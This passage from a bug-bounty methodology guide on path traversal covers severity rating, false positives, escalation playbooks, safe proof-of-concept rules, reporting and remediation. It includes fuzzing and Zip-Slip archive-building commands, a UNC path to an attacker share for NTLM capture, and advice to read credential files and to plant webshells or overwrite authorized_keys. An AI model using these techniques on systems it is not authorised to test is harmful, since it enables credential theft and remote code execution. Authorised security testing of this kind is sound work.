| Read of other users'/tenant files | **High** | …it's mass PII / session-token → ATO (§11). |
| WRITE of a benign file outside the base dir | **High–Critical** | …the location is executable/served or a key/cron (→ RCE) (§12–§14). |
| Server-normalization traversal (nginx/Tomcat) | **High** | …it reaches `WEB-INF`/`.git`/`web.config`/backups (source+secrets). |
| Include/execute of the file | (LFI) | …use the LFI kit — that's RCE via wrappers/log-poison. |

## 16.3 Production-scope discipline
Read only what proves impact (redact secrets; don't exfiltrate real users' data at scale). For WRITE, use a **benign, uniquely-named marker** to a **safe path** and **never overwrite a real key/config/served file** — describe the destructive escalation instead of doing it. Re-test partial fixes (stripping `../` once but not `....//`, or fixing the app but not the nginx `alias` = a fresh finding).

---

# 17. False Positives — STOP reporting these (auto-reject list)

| # | Commonly mis-reported | Why it's NOT (by default) | When it IS valid |
|---|---|---|---|
| 1 | **`../` changes the response but stays in the base dir** | No directory escape. | You reach a file **outside** the intended dir. |
| 2 | **`/etc/passwd` read, reported as Critical** | Non-secret file; Medium by design. | You read **secrets/source/cross-user** files (§10/§11). |
| 3 | **curl/browser "traversal" that was collapsed client-side** | The `../` never reached the server. | Use `--path-as-is`/Burp; the raw `../` transmits and works. |
| 4 | **A 404/500 on `../` payloads** | No file returned/written. | A file's bytes come back, or a file is written out-of-dir. |
| 5 | **"Zip-Slip" with no proof of out-of-dir write** | Fingerprint, not impact. | A benign marker provably lands **outside** the extraction dir. |
| 6 | **Reading a file the app is SUPPOSED to serve** | Intended functionality. | An **unintended** sensitive/other-user file. |
| 7 | **Write that lands only inside your own upload dir** | No escape. | The write escapes to an executable/shared/key location. |
| 8 | **Include/execute sink reported here** | Wrong class. | Report via the **LFI/RFI kit** (RCE), not as "traversal". |

> Rule of thumb: if you can't say *"I reached `<a file OUTSIDE the intended directory>` and it was `<a secret/source/other-user file I read>` or `<a benign file I wrote to an executable/key location>`,"* you have a **path change, not a traversal vulnerability** — usually Low/Info. Escape the dir, reach something that matters.

---

# 18. Severity Calibration — how triagers really rate traversal

| Scenario | Typical | What moves it |
|---|---|---|
| **Write-traversal (Zip-Slip/upload/save) → webshell or key/cron overwrite → RCE** | **Critical** | Proven code exec / persistence. |
| **Read-traversal → app secrets/source → creds → RCE/cloud elsewhere** | **High–Critical** | The pivot the creds enable. |
| **Read-traversal → other users' / cross-tenant files (PII, tokens)** | **High** | Scale of data; session-token → ATO. |
| **Server-normalization traversal → `WEB-INF`/`.git`/`web.config`/backups** | **High** | Source + secrets exposure. |
| **Read of non-secret file (`/etc/passwd`, `win.ini`)** | **Medium** | Confirmation only; climb to secrets. |
| **Write only inside the sandbox / no escape** | **Low/Info** | Not a traversal. |

**CVSS / CWE:**
- Read-traversal (secrets): `AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N` → High. **CWE-22** (Path Traversal) — anchor. Absolute-path variant **CWE-36**; relative **CWE-23**; `../` **CWE-24**, `..\` **CWE-25**; symlink **CWE-59**.
- Write-traversal → RCE: `C:H/I:H/A:H` → Critical. **CWE-22 + CWE-434** (if via upload) / CWE-73 (external control of filename/path).
- Cross-tenant read: **CWE-22 + CWE-284/639** (authorization). Server-normalization: cite the exact server/CVE.

---

# 19. Impact-Escalation Playbooks — "you found X, now do Y"

### 19.1 You found: *a read sink returns `/etc/passwd`*
- **Escalate:** stop reading passwd — read **`.env`/app config → DB/cloud creds** (§10), the app **source**, `~/.ssh/id_rsa`, `/proc/self/environ`, cloud/k8s creds. Then pivot the creds (SSRF/JWT kits).
- **Evidence:** the sensitive bytes (redacted) + the pivot they enable.
- **Severity:** Medium → High–Critical.

### 19.2 You found: *a per-user file download with a path param*
- **Escalate:** traverse/swap to **other users' / other tenants'** files → cross-user PII; try **session/token files** → ATO (§11).
- **Evidence:** another (own second) account's file read via your session.
- **Severity:** **High**.

### 19.3 You found: *an "import ZIP" / restore / theme-install feature*
- **Escalate:** **Zip-Slip** — build a benign archive whose entry name traverses to a safe path; confirm the out-of-dir write, then describe the **webshell-in-webroot** escalation (§12).
- **Evidence:** a benign marker file written **outside** the extraction dir (path shown).
- **Severity:** **Critical** (RCE-capable).

### 19.4 You found: *an upload keeps my filename / a dest-path field*
- **Escalate:** put `../` in the filename/dest → write to the **webroot** (webshell) or **overwrite** a served/config/key file (§13; FileUpload kit for executability).
- **Evidence:** the file landing outside the upload dir / a benign overwrite proof.
- **Severity:** **Critical**.

### 19.5 You found: *files served from `/static` (nginx)*
- **Escalate:** **alias off-by-slash** — `/static../` → parent dir → read `WEB-INF`/config/source/`.git` (§8).
- **Evidence:** a sensitive file read via the server-normalization payload.
- **Severity:** **High**.

---

# 20. Building a Professional, Safe PoC

```
DO:
  □ READ: retrieve just enough of a sensitive file to prove it (a few lines of .env/config), REDACT real secrets/PII,
    and read only YOUR OWN data where cross-user (use a second own account as the "victim").
  □ WRITE: write a BENIGN, uniquely-named marker (pt-poc-<rand>.txt with your handle/program/timestamp) to a SAFE path
    you can read back (proves the escape). Then DESCRIBE the webshell/overwrite escalation — don't actually drop a live
    shell except on your OWN test instance, and NEVER overwrite a real key/config/served file.
  □ Zip-Slip: ship the benign traversing archive (poc/zipslip_build.py) + show WHERE the marker landed (outside the dir).
  □ Capture: exact request/upload + the payload + the read bytes / the written marker's absolute path / RCE proof (own box).
DON'T:
  □ Mass-exfiltrate real users' files, dump whole secret stores, or read data you don't need for the PoC.
  □ Overwrite or delete real files (authorized_keys/config/served assets) on production.
  □ Drop a working webshell on production (prove write + describe; shell only on your own instance).
  □ Report /etc/passwd as Critical, or a same-dir path change as a traversal.
```
> The single most important restraint: **read only enough to prove it, write only a benign marker to a safe path, never overwrite real files.** You can demonstrate secret-read and out-of-dir-write impact without harming anyone. Same discipline as the LFI/FileUpload kits.

**Remediation to include:** never build filesystem paths from client input — map a client **key/ID → a server-side known path** (indirection); if you must accept a name, **canonicalize** (`realpath`/`getCanonicalPath`/`path.resolve`) **then verify the result still starts with the intended base dir** (and reject otherwise); reject `../`, absolute paths, NUL, and encoded variants *after* decoding; for **extraction**, validate each entry's resolved path is within the target dir before writing (defeats Zip-Slip), and refuse symlinks/absolute entries; for **uploads**, generate server-side filenames (don't trust the client filename); fix the **server config** (nginx `alias` with matching trailing slashes; disable `..;/`); run the file service with **least privilege** (can't read `.env`/keys or write the webroot).

---

# 21. Reporting, CWE/CVSS & De-duplication

Use `PATH_TRAVERSAL_REPORT_TEMPLATE.md`. Minimum:
```
1. Title        "Path traversal on <endpoint> via <param> → <secret/source disclosure | cross-tenant file read |
                arbitrary file WRITE (Zip-Slip) → RCE>" — name the DIRECTION + IMPACT.
2. Severity     CVSS 3.1 vector + score + CWE-22 (+ CWE-36/23/434/59 by variant)
3. Asset        exact endpoint/upload + param + sink direction (read/serve/write) + server/framework if server-normalization
4. Summary      how you control the path, how you escaped the base dir, read-or-wrote what
5. Steps        numbered: the request/upload w/ payload → the read bytes / the written marker's out-of-dir location
6. PoC          the sensitive file read (redacted) / the benign marker written outside the dir / RCE proof (own instance)
7. Impact       secret→pivot/RCE / cross-tenant PII / write→webshell/overwrite→RCE — the "so what"
8. Remediation  path indirection + canonicalize-then-confine + per-entry extraction check + server-config fix (§20)
```
**De-dup:** one root cause (unconfined path handling) = one finding even if several params/files are reachable; lead with the highest-impact (write>secret-read>passwd-read). A **read** sink and a **write** sink are usually **separate** findings (different code, different fix). An **include/execute** sink is an **LFI** report, not this. Don't split "traversal confirmed" and "secret read" — one chain.

---

# 22. Automation & Red-Team Notes

**Automation (find candidates fast, verify by hand):**
```bash
python3 poc/pt_read_fuzz.py -u "https://target/download?file=FUZZ" --read /etc/passwd --marker "root:x:0:0"
python3 poc/pt_read_fuzz.py -u "https://target/static/FUZZ" --read /etc/passwd --marker "root:x:0:0"   # server-normalization
python3 poc/zipslip_build.py --out evil.zip --name "../../../../tmp/pt-<rand>.txt" --content benign   # then upload+verify
python3 poc/write_probe.py -u https://target/upload --field filename --marker pt-<rand>              # write-path test
ffuf -u "https://target/download?file=FUZZ" -w traversal-wordlist.txt -mr "root:"                     # depth/encoding sweep
nuclei -l live.txt -tags lfi,traversal -o pt.txt
# curl MUST use --path-as-is so the ../ isn't collapsed client-side.
```
- **Quality gate:** never submit "`../` changed the response." Reproduce the **impact** by hand — a secret/source/cross-user **read**, or a benign **out-of-dir write** (with the landed path), or RCE on your own instance — and prove it safely (§20). `/etc/passwd` alone is Medium.

**Red-team angles:**
```
□ Zip-Slip via a theme/plugin/backup import → webshell in the webroot → foothold. (Snyk Zip-Slip class.)
□ Save/export path → overwrite ~/.ssh/authorized_keys → SSH → persistence.
□ nginx alias off-by-slash / Tomcat ..;/ → read WEB-INF / .git / .env → creds → pivot (no app bug needed).
□ Cross-tenant read of session-token files → mass ATO.
□ Windows UNC path (\\attacker\share) in a traversal → outbound SMB → NetNTLM capture/relay.
□ Read app source → find hardcoded keys → sign JWTs (JWT kit) / discover more sinks.
□ Include/execute sink → hand to LFI kit for wrapper/log-poison/filter-chain RCE.
```

---

# Appendix A — Traversal Workflow Cheat Sheet

```
┌────────────────────────────────────────────────────────────────────┐
│                   PATH / DIRECTORY TRAVERSAL WORKFLOW               │
├────────────────────────────────────────────────────────────────────┤
│ 0. RECON: path sinks — download/serve, static routing, archive     │
│    extract, upload filename/path, save/export path §3              │
│ 1. BASELINE ★ : confirm traversal + CLASSIFY: read / write /       │
│    include(→LFI kit)? §4                                           │
│ 2. REACH/BYPASS: escape dir (../, absolute, ....//) §5 ·           │
│    encode (%2f,%252f,overlong) §6 · beat prefix/suffix/allowlist   │
│    §7 · SERVER-NORMALIZATION (nginx alias, ..;/, UNC) §8           │
│ 3. IMPACT ⭐ (map §9):                                              │
│    READ  → secrets/source .................. §10 ⭐⭐               │
│          → other users'/cross-tenant ....... §11 ⭐                │
│    WRITE → Zip-Slip (extract) → RCE ........ §12 ⭐⭐⭐              │
│          → upload path → webshell/overwrite  §13 ⭐⭐⭐              │
│          → save/export → keys/cron → RCE ... §14 ⭐⭐⭐              │
│    INCLUDE/EXEC → LFI kit                                          │
│ 4. VALIDATE → REPORT:                                             │
│    FP filter §17 (passwd=Med; escape the dir!) · CVSS+CWE-22 §18 · │
│    SAFE PoC: benign marker, no destructive overwrite §20 ·        │
│    title = DIRECTION+IMPACT, dedup §21                            │
└────────────────────────────────────────────────────────────────────┘
```

---

# Appendix B — Traversal Decision Tree

```
Influence a path param / filename / archive entry / dest (§4) →
│
├─ Sink INCLUDES/EXECUTES the file? → ***LFI/RFI kit*** (wrapper/log-poison/filter-chain → RCE). Not this kit.
│
├─ Sink READS/SERVES bytes?
│   ├─ Escape the base dir (../, absolute, ....//, encoding, server-normalization §5–§8) →
│   │   ├─ Read app SECRETS/SOURCE (.env/config/keys/cloud-creds)? → creds → pivot/RCE. HIGH–CRIT (§10). ⭐
│   │   ├─ Read OTHER USERS'/tenant files or session tokens? → PII / ATO. HIGH (§11). ⭐
│   │   └─ Only /etc/passwd-class non-secret? → MEDIUM; climb to secrets (§10).
│
├─ Sink WRITES a file (save / upload-path / archive-EXTRACT)?
│   ├─ Can a benign marker land OUTSIDE the base dir? (prove the escape) →
│   │   ├─ Executable/served location (webroot .php/.jsp/.aspx)? → webshell → RCE. CRITICAL (§12/§13). ⭐
│   │   ├─ ~/.ssh/authorized_keys / cron / config / CI file? → overwrite → RCE/persistence. CRITICAL (§14). ⭐
│   │   └─ Only inside your sandbox? → no escape → Low/Info (§17).
│
└─ Path changes but stays in-dir / gets 404 / collapsed client-side? → not a traversal (§17). Use --path-as-is; keep hunting.

ALWAYS: escape the DIR and reach something that matters; benign markers for writes; never overwrite real files (§20).
```

---

# Appendix C — Important Links & References

**Primary (learn + labs)**
- PortSwigger Web Security Academy — *Directory / path traversal* (theory + labs): https://portswigger.net/web-security/file-path-traversal
- OWASP — *Path Traversal* & *Testing Directory Traversal / File Include* (WSTG-ATHZ-01): https://owasp.org/www-community/attacks/Path_Traversal
- OWASP Cheat Sheet — *File Upload* & input-validation (write-side): https://cheatsheetseries.owasp.org/
- PayloadsAllTheThings — *Directory Traversal*: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
- HackTricks — *File path traversal* & *Zip tricks*: https://book.hacktricks.xyz/pentesting-web/file-inclusion

**Foundational research & real-world**
- **Snyk — "Zip Slip"** (2018, the archive-extraction write-traversal class that hit many libraries): https://snyk.io/research/zip-slip-vulnerability
- **Python `tarfile.extractall`** — CVE-2007-4559 (the 15-year tar path-traversal), and `zipfile` extraction traversal.
- **nginx `alias` off-by-slash** traversal (a classic misconfig); **Tomcat `..;/`** WEB-INF disclosure.
- IIS Unicode/overlong `../` (the historical `%c0%af` traversals) — the encoding-bypass origin.

**Bug-bounty writeups**
- Disclosed HackerOne / Bugcrowd reports — search *"path traversal"*, *"zip slip"*, *"arbitrary file read"*, *"arbitrary file write"*, *"nginx alias traversal"*, *"..;/ WEB-INF"*.

**Tools**
- `ffuf`/`feroxbuster` (fuzz + depth) · `nuclei` (`-tags lfi,traversal`) · Burp Intruder · `curl --path-as-is` · this kit's `poc/` (pt_read_fuzz / zipslip_build / write_probe) · sibling kits `LFI/` (include→RCE), `RFI/`, `FileUpload/`.

**CWE / standards to cite**
- **CWE-22** (Path Traversal — anchor) · **CWE-23** (relative) · **CWE-24/25** (`../` / `..\`) · **CWE-36** (absolute path) · **CWE-59** (link following) · **CWE-73** (external control of filename/path) · **CWE-434** (upload, write side): https://cwe.mitre.org/

---

> **Final reminder — the one rule that pays:** *Traversal is only a finding when you escape the intended directory and reach something that matters.* Reading `/etc/passwd` is a Medium proof; the money is **reading your target's secrets/source/other-users' files** (High–Critical pivots) or — the side this kit owns — **WRITING a file outside the base dir** via Zip-Slip, an upload path, or a save/export sink to drop a **webshell** or overwrite **`authorized_keys`/cron** (**Critical RCE/persistence**). Beat the filter with `....//`/encoding/server-normalization, prove it with **benign markers** (never overwrite real files), and if the sink *executes* the file — that's the **LFI kit**. Escape the dir, reach the secret or the write, and report the RCE/disclosure — not the `../`.
